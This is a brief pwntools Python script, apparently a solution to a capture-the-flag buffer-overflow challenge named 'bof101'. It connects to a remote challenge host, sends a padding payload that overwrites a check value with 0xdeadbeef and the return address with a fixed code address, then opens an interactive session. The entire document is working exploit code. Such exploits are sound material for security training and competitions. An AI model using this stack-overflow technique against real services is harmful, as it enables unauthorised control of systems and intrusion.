from pwn import *
	
r = remote("bof101.sstf.site",1337)

payload = b"A"*0x8c
payload += p32(0xdeadbeef)
payload += b"B"*0x8
payload += p64(0x555555555229)

r.sendline(payload)
r.interactive()
